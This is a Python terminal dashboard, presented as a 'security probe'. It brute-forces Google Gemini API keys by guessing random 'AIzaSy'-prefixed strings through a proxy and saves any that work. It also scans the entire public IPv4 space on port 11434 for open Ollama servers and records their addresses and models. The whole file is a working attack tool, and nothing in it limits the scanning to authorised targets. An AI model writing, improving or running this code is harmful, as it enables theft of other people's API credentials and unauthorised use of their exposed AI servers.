import curses
import threading
import time
import requests
import random
import string
import queue
import ipaddress
from collections import deque
from datetime import timedelta

# --- Configuration ---
GEMINI_PROXY_URL = "https://gemini-proxy.keyikai.me/v1beta/models"
GEMINI_PREFIX = "AIzaSy"
GEMINI_KEY_LENGTH = 33
GEMINI_CHARSET = string.ascii_letters + string.digits + "-_"
GEMINI_THREADS = 30

OLLAMA_PORT = 11434
OLLAMA_API_PATH = "/api/tags"
OLLAMA_THREADS = 750
OLLAMA_TIMEOUT = 2.5

# IPv4 Scan Range for Progress Bar
IP_SCAN_START = int(ipaddress.ip_address('1.0.0.1'))
IP_SCAN_END = int(ipaddress.ip_address('223.255.255.254'))
IP_SCAN_TOTAL = IP_SCAN_END - IP_SCAN_START

OUTPUT_KEYS_FILE = "keys.txt"
OUTPUT_OLLAMA_FILE = "ollama.txt"
LOG_MAX_LINES = 200
DASHBOARD_START_TIME = time.time()

# --- Global State ---
gemini_running = threading.Event()
ollama_running = threading.Event()
gemini_stats = {'attempts': 0, 'found': 0, 'rate': 0.0}
ollama_stats = {'scanned': 0, 'found': 0, 'rate': 0.0, 'current_ip_int': IP_SCAN_START}
gemini_logs = deque(maxlen=LOG_MAX_LINES)
ollama_logs = deque(maxlen=LOG_MAX_LINES)
ip_queue = queue.Queue(maxsize=OLLAMA_THREADS * 2)

# Locks
stats_lock = threading.Lock()
log_lock = threading.Lock()
file_lock = threading.Lock()

# --- Probe Logic (Unchanged, but supports new stats) ---

def gemini_worker():
    while gemini_running.is_set():
        random_part = ''.join(random.choice(GEMINI_CHARSET) for _ in range(GEMINI_KEY_LENGTH))
        if random_part.count('-') + random_part.count('_') > 2: continue
        key = GEMINI_PREFIX + random_part
        test_url = f"{GEMINI_PROXY_URL}?key={key}"
        log_msg = ""
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                with stats_lock: gemini_stats['found'] += 1
                log_msg = f"[✓] FOUND: {key}"
                with file_lock: open(OUTPUT_KEYS_FILE, 'a').write(key + '\n')
            elif r.status_code == 429:
                log_msg = f"[!] WARN: Rate limited by proxy. Pausing."
                time.sleep(10)
            else:
                log_msg = f"[✗] FAILED: {key[:12]}... (Status: {r.status_code})"
        except requests.exceptions.RequestException:
            log_msg = f"[✗] FAILED: {key[:12]}... (Error: Connection)"
        finally:
            with log_lock: gemini_logs.appendleft(log_msg)
            with stats_lock: gemini_stats['attempts'] += 1

def gemini_probe_master():
    with log_lock: gemini_logs.appendleft("[i] INFO: Gemini Probe Started via Proxy.")
    threads = [threading.Thread(target=gemini_worker, daemon=True) for _ in range(GEMINI_THREADS)]
    for t in threads: t.start()
    for t in threads: t.join()
    with log_lock: gemini_logs.appendleft("[i] INFO: Gemini Probe Stopped.")

def ollama_ip_producer():
    for i in range(IP_SCAN_START, IP_SCAN_END + 1):
        if not ollama_running.is_set(): break
        with stats_lock: ollama_stats['current_ip_int'] = i
        ip = str(ipaddress.ip_address(i))
        if ipaddress.ip_address(ip).is_global: ip_queue.put(ip)
    while ollama_running.is_set(): time.sleep(1)

def ollama_worker():
    while ollama_running.is_set():
        try:
            ip = ip_queue.get(timeout=1)
            url = f"http://{ip}:{OLLAMA_PORT}{OLLAMA_API_PATH}"
            log_msg = ""
            try:
                r = requests.get(url, timeout=OLLAMA_TIMEOUT)
                if r.status_code == 200 and 'models' in r.json():
                    models = [m['name'] for m in r.json()['models']]
                    result = f"http://{ip}:{OLLAMA_PORT} | Models: {models}"
                    with stats_lock: ollama_stats['found'] += 1
                    log_msg = f"[✓] FOUND: {result}"
                    with file_lock: open(OUTPUT_OLLAMA_FILE, 'a').write(result + '\n')
                else:
                    log_msg = f"[✗] FAILED: {ip} (Status: {r.status_code})"
            except requests.exceptions.RequestException:
                log_msg = f"[✗] FAILED: {ip} (Error: Connection/Timeout)"
            finally:
                with log_lock: ollama_logs.appendleft(log_msg)
                with stats_lock: ollama_stats['scanned'] += 1
                ip_queue.task_done()
        except queue.Empty: continue

def ollama_probe_master():
    with log_lock: ollama_logs.appendleft("[i] INFO: Ollama Probe Started.")
    producer = threading.Thread(target=ollama_ip_producer, daemon=True); producer.start()
    workers = [threading.Thread(target=ollama_worker, daemon=True) for _ in range(OLLAMA_THREADS)]
    for w in workers: w.start()
    producer.join()
    for w in workers: w.join()
    with log_lock: ollama_logs.appendleft("[i] INFO: Ollama Probe Stopped.")

# --- TUI Drawing Logic ---

def format_seconds(seconds):
    return str(timedelta(seconds=int(seconds)))

def render_progress_bar(percent, width):
    filled_width = int(percent / 100 * width)
    bar = '█' * filled_width + '─' * (width - filled_width)
    return f"[{bar}] {percent:.2f}%"

def draw_panel(stdscr, y, x, height, width, title, data, color):
    panel = stdscr.subwin(height, width, y, x)
    panel.erase()
    panel.border()
    panel.addstr(0, 2, f" {title} ", curses.color_pair(color) | curses.A_BOLD)
    for i, line in enumerate(data):
        panel.addstr(i + 2, 2, line)
    panel.refresh()

def draw_log_panel(stdscr, y, x, height, width, title, logs, active):
    panel = stdscr.subwin(height, width, y, x)
    panel.erase()
    panel.border()
    title_color = 4 if active else 5
    panel.addstr(0, 2, f" {title} ", curses.color_pair(title_color) | curses.A_BOLD)
    
    with log_lock:
        for i, log_line in enumerate(list(logs)):
            if i >= height - 2: break
            line_to_print = log_line[:width-3]
            color = curses.color_pair(5) # Default
            if log_line.startswith("[✓]"): color = curses.color_pair(1)
            elif log_line.startswith("[✗]"): color = curses.color_pair(2)
            elif log_line.startswith("[!]"): color = curses.color_pair(3)
            panel.addstr(i + 1, 2, line_to_print, color)
    panel.refresh()

def main(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(1)
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)
    curses.init_pair(2, curses.COLOR_RED, -1)
    curses.init_pair(3, curses.COLOR_YELLOW, -1)
    curses.init_pair(4, curses.COLOR_CYAN, -1)
    curses.init_pair(5, curses.COLOR_WHITE, -1)
    
    current_view = 'gemini'
    last_time, last_gemini_attempts, last_ollama_scanned = time.time(), 0, 0
    
    probe_threads = {}

    while True:
        height, width = stdscr.getmaxyx()
        
        # --- Handle Input ---
        key = stdscr.getch()
        if key == ord('q'):
            gemini_running.clear(); ollama_running.clear()
            time.sleep(1.5); break
        elif key == ord('g'):
            if not gemini_running.is_set():
                gemini_running.set()
                probe_threads['gemini'] = threading.Thread(target=gemini_probe_master, daemon=True); probe_threads['gemini'].start()
            else: gemini_running.clear()
        elif key == ord('o'):
            if not ollama_running.is_set():
                ollama_running.set()
                probe_threads['ollama'] = threading.Thread(target=ollama_probe_master, daemon=True); probe_threads['ollama'].start()
            else: ollama_running.clear()
        elif key == ord('l'):
            current_view = 'ollama' if current_view == 'gemini' else 'gemini'

        # --- Update Stats ---
        current_time = time.time()
        if (elapsed := current_time - last_time) >= 1.0:
            with stats_lock:
                gemini_stats['rate'] = (gemini_stats['attempts'] - last_gemini_attempts) / elapsed
                ollama_stats['rate'] = (ollama_stats['scanned'] - last_ollama_scanned) / elapsed
                last_gemini_attempts = gemini_stats['attempts']
                last_ollama_scanned = ollama_stats['scanned']
            last_time = current_time

        # --- Prepare Data for Panels ---
        g_status, g_color = ("● RUNNING", 1) if gemini_running.is_set() else ("● STOPPED", 2)
        gemini_data = [
            f"Status:   ",
            f"Attempts: {gemini_stats['attempts']:,}",
            f"Rate:     {gemini_stats['rate']:.2f} keys/s",
            f"Found:    {gemini_stats['found']}"
        ]
        
        o_status, o_color = ("● RUNNING", 1) if ollama_running.is_set() else ("● STOPPED", 2)
        progress_percent = ((ollama_stats['current_ip_int'] - IP_SCAN_START) / IP_SCAN_TOTAL) * 100
        ollama_data = [
            f"Status:   ",
            f"Scanned:  {ollama_stats['scanned']:,}",
            f"Rate:     {ollama_stats['rate']:.2f} IP/s",
            f"Found:    {ollama_stats['found']}",
            "",
            "Progress:",
            render_progress_bar(progress_percent, (width // 2) - 6)
        ]
        
        # --- Draw UI ---
        stdscr.erase()
        
        # Header
        uptime = format_seconds(time.time() - DASHBOARD_START_TIME)
        title = f" UNIFIED SECURITY PROBE DASHBOARD | UPTIME: {uptime} "
        stdscr.addstr(0, (width - len(title)) // 2, title, curses.A_BOLD)
        controls = "[G] Toggle Gemini | [O] Toggle Ollama | [L] Switch Log View | [Q] Quit"
        stdscr.addstr(1, (width - len(controls)) // 2, controls, curses.color_pair(3))

        # Panels
        panel_height = 10
        mid_width = width // 2
        draw_panel(stdscr, 3, 0, panel_height, mid_width, f"Gemini Probe {g_status}", gemini_data, g_color)
        stdscr.addstr(5, 12, g_status, curses.color_pair(g_color) | curses.A_BOLD) # Overlay status text
        
        draw_panel(stdscr, 3, mid_width, panel_height, width - mid_width, f"Ollama Probe {o_status}", ollama_data, o_color)
        stdscr.addstr(5, mid_width + 12, o_status, curses.color_pair(o_color) | curses.A_BOLD) # Overlay status text

        # Log Panels
        log_panel_y = 3 + panel_height
        log_panel_height = height - log_panel_y
        draw_log_panel(stdscr, log_panel_y, 0, log_panel_height, mid_width, "Gemini Logs", gemini_logs, current_view == 'gemini')
        draw_log_panel(stdscr, log_panel_y, mid_width, log_panel_height, width - mid_width, "Ollama Logs", ollama_logs, current_view == 'ollama')

        stdscr.refresh()
        time.sleep(0.1)

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        print("Shutdown complete.")
    except Exception as e:
        print(f"An error occurred: {e}")
        print("If on Windows, ensure 'pip install windows-curses' is run.")
